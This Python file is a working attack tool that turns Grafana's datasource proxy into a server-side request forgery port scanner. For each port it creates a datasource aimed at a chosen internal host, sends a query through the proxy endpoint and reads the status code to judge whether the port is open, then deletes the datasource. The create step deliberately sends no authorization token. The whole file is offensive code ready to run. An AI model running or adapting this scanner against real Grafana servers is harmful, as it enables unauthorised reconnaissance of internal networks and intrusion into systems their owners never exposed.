import argparse
import json
import sys
import time
from typing import Optional, List, Dict
from urllib.parse import urljoin

import requests


class GrafanaSSRFScanner:
    def __init__(self, grafana_url: str, token: Optional[str] = None,
                 extra_headers: Optional[Dict[str, str]] = None, verbose: bool = False):
        self.grafana_url = grafana_url.rstrip('/')
        self.token = token
        self.verbose = verbose
        self.session = requests.Session()
        self.session_create = requests.Session()  # no auth; with token Grafana returns bad request
        if self.token:
            self.session.headers['Authorization'] = f'Bearer {self.token}'
        for s in (self.session, self.session_create):
            s.headers['Content-Type'] = 'application/json'
        if extra_headers:
            for k, v in extra_headers.items():
                self.session.headers[k] = v
                self.session_create.headers[k] = v

    def create_datasource(self, name: str, target_host: str, target_port: int,
                          datasource_type: str = "alertmanager") -> tuple[Optional[int], Optional[str]]:
        """Create datasource. Returns (id, None) on success or (None, error_message)."""
        url = urljoin(self.grafana_url, '/api/datasources/')
        payload = {
            "name": name,
            "type": datasource_type,
            "access": "proxy",
            "url": f"{target_host}:{target_port}"
        }
        try:
            r = self.session_create.post(
                url, json=payload, timeout=2,
                allow_redirects=False  # avoid following to login page and parsing HTML as JSON
            )
            if r.status_code != 200:
                if self.verbose and r.status_code == 401:
                    print("[DEBUG] Create datasource request headers:", dict(r.request.headers), file=sys.stderr)
                    print("[DEBUG] Response:", r.text[:500], file=sys.stderr)
                err = f"HTTP {r.status_code}"
                if r.status_code == 401:
                    try:
                        body = r.json()
                        if body.get("messageId") == "session.token.rotate":
                            err = "HTTP 401 (session cookie rotated — get fresh Cookie from browser)"
                        elif body.get("message") == "Unauthorized":
                            err = "HTTP 401 (invalid or expired Cookie?)"
                    except Exception:
                        err = "HTTP 401 (invalid or expired Cookie?)"
                return None, err
            data = r.json()
            ds = data.get('datasource') or data
            ds_id = ds.get('id') or data.get('id')
            return (ds_id, None) if ds_id is not None else (None, "no id in response")
        except requests.exceptions.Timeout:
            return None, "timeout"
        except ValueError as e:
            return None, f"invalid JSON ({e})"
        except Exception as e:
            return None, str(e)

    def test_ssrf(self, datasource_id: int, query: str = "up") -> Dict:
        """Probe via proxy endpoint. Port is 'open' if backend responded (any HTTP code except 502/503)."""
        url = urljoin(self.grafana_url, f'/api/datasources/proxy/{datasource_id}/api/v1/query')
        try:
            r = self.session.get(url, params={'query': query}, timeout=1)
            # 0 = error, 502/503 = proxy couldn't connect to backend; anything else = port reached
            backend_reached = r.status_code not in (0, 502, 503)
            return {
                'status_code': r.status_code,
                'success': backend_reached,
                'response': r.text,
                'json': r.json() if 'application/json' in r.headers.get('content-type', '') else None
            }
        except requests.exceptions.Timeout:
            return {'status_code': 0, 'success': False, 'response': 'Timeout', 'json': None}
        except Exception as e:
            return {'status_code': 0, 'success': False, 'response': str(e), 'json': None}

    def delete_datasource(self, datasource_id: int) -> bool:
        """Delete datasource (same session as create)."""
        url = urljoin(self.grafana_url, f'/api/datasources/{datasource_id}')
        try:
            r = self.session_create.delete(url, timeout=2, allow_redirects=False)
            return r.status_code in (200, 404)
        except Exception:
            return False

    def scan_port(self, target_host: str, port: int, name_prefix: str = "ssrf-scan",
                  run_id: Optional[str] = None) -> Dict:
        """Create -> test -> delete for one port."""
        name = f"{name_prefix}-{run_id}-{port}" if run_id else f"{name_prefix}-{port}"
        ds_id, create_err = self.create_datasource(name, target_host, port)
        if ds_id is None:
            msg = f"Failed to create datasource: {create_err}" if create_err else "Failed to create datasource"
            return {'port': port, 'status': 'error', 'message': msg}
        try:
            result = self.test_ssrf(ds_id)
            return {
                'port': port,
                'status': 'open' if result['success'] else 'closed/filtered',
                'status_code': result['status_code'],
                'response': (result['response'] or '')[:200],
                'json': result.get('json')
            }
        finally:
            self.delete_datasource(ds_id)

    def scan_ports(self, target_host: str, ports: List[int],
                   name_prefix: str = "ssrf-scan") -> List[Dict]:
        """Scan ports sequentially. Unique run_id avoids name collisions with stale runs."""
        run_id = str(time.time_ns())
        results = []
        total = len(ports)
        start = time.perf_counter()
        for i, port in enumerate(ports):
            r = self.scan_port(target_host, port, name_prefix, run_id)
            results.append(r)
            if r['status'] == 'open':
                print(f"[+] Port {port} open (HTTP {r['status_code']})")
            if (i + 1) % 10 == 0 or i + 1 == total:
                elapsed = time.perf_counter() - start
                rate = (i + 1) / elapsed if elapsed > 0 else 0
                print(f"\r[*] {i + 1}/{total} ports ({rate:.1f}/s)", end='', flush=True)
        if total:
            print()
        return results


def parse_ports(s: str) -> List[int]:
    """Parse ports string: 80,443 or 80-90 or both."""
    out = []
    for part in s.split(','):
        part = part.strip()
        if '-' in part:
            lo, hi = part.split('-', 1)
            out.extend(range(int(lo), int(hi) + 1))
        else:
            out.append(int(part))
    return sorted(set(out))


def main():
    p = argparse.ArgumentParser(description='Grafana SSRF Scanner — port scan via datasource proxy.')
    p.add_argument('-u', '--url', required=True, help='Grafana base URL (e.g. http://host:3000)')
    p.add_argument('-t', '--target', required=True, help='Target host to scan')
    p.add_argument('-p', '--ports', required=True, help='Ports: 80,443 or 80-90')
    p.add_argument('--token', help='Grafana token (optional; proxy uses it, create does not)')
    p.add_argument('-H', '--header', action='append', default=[], metavar='HEADER',
                   help='Extra header (e.g. -H "X-Foo: bar"); can be repeated')
    p.add_argument('-o', '--output', help='Write results JSON to file')
    p.add_argument('-v', '--verbose', action='store_true', help='Show response snippet for open ports')
    args = p.parse_args()

    try:
        ports = parse_ports(args.ports)
    except ValueError as e:
        print(f"Error parsing ports: {e}", file=sys.stderr)
        sys.exit(1)
    if not ports:
        print("No ports to scan.", file=sys.stderr)
        sys.exit(1)

    extra_headers = {}
    for h in args.header:
        if ':' in h:
            k, v = h.split(':', 1)
            extra_headers[k.strip()] = v.strip()
        else:
            print(f"Warning: skipping malformed header {h!r}", file=sys.stderr)

    scanner = GrafanaSSRFScanner(
        args.url, args.token,
        extra_headers=extra_headers or None,
        verbose=args.verbose
    )
    print(f"\n[*] Target: {args.target}")
    print(f"[*] Ports: {len(ports)}\n")

    t0 = time.perf_counter()
    results = scanner.scan_ports(args.target, ports)
    elapsed = time.perf_counter() - t0
    rate = len(ports) / elapsed if elapsed > 0 else 0

    print("\n" + "=" * 50)
    print("SCAN RESULTS")
    print("=" * 50)
    print(f"\n[*] Time: {elapsed:.1f}s  Rate: {rate:.1f} ports/s")

    open_ports = [r for r in results if r['status'] == 'open']
    errors = [r for r in results if r.get('status') == 'error']
    timeouts = [r for r in results if r.get('status') == 'timeout']
    closed = [r for r in results if r['status'] not in ('open', 'error', 'timeout')]

    if open_ports:
        print(f"\n[+] Open ({len(open_ports)}):")
        for r in open_ports:
            print(f"    {r['port']}  HTTP {r['status_code']}")
            resp = r.get('response') or ''
            if r.get('json'):
                s = json.dumps(r['json'])
                print(f"      response: {s[:400]}{'...' if len(s) > 400 else ''}")
            elif resp:
                print(f"      response: {resp[:400]}{'...' if len(resp) > 400 else ''}")
    if errors:
        print(f"\n[-] Errors ({len(errors)}):")
        for r in errors[:10]:
            print(f"    {r['port']}: {r.get('message', '')[:80]}")
        if len(errors) > 10:
            print(f"    ... and {len(errors) - 10} more")
    if timeouts:
        print(f"\n[!] Timeout ({len(timeouts)}): {[r['port'] for r in timeouts]}")
    if closed:
        print(f"\n[-] Closed/filtered ({len(closed)}): {[r['port'] for r in closed]}")

    if args.output:
        with open(args.output, 'w') as f:
            json.dump({
                'target': args.target,
                'grafana_url': args.url,
                'results': results,
                'summary': {'total': len(results), 'open': len(open_ports), 'error': len(errors),
                           'timeout': len(timeouts), 'closed': len(closed)}
            }, f, indent=2)
        print(f"\n[+] Results saved to {args.output}")
    print()


if __name__ == '__main__':
    main()
